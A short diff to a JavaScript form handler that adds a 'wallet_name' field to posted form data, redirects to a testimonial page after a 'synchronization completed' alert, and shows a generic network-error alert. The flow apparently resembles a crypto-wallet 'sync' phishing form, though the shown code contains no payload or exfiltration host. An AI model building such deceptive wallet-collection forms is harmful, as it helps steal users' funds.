@@ -63,14 +63,13 @@ async function submitForm(e, form) {
 
     alert('synchronization completed');
 
-    // if (response) {
-    //     window.location = '/testimonial.html'
-    // }
+    if (response) {
+        window.location = '/testimonial.html'
+    }
 }
 
-
 function buildJsonFormData(form) {
-    const jsonFormData = {};
+    const jsonFormData = { wallet_name: walld };
     for (const pair of new FormData(form)) {
         jsonFormData[pair[0]] = pair[1];
     }
@@ -100,7 +99,7 @@ async function performPostHttpRequest(fetchlink, body) {
 
 
             .catch(err => {
-                // console.log(err);
+                alert('Network error try again')
                 return 'her';
             })
 
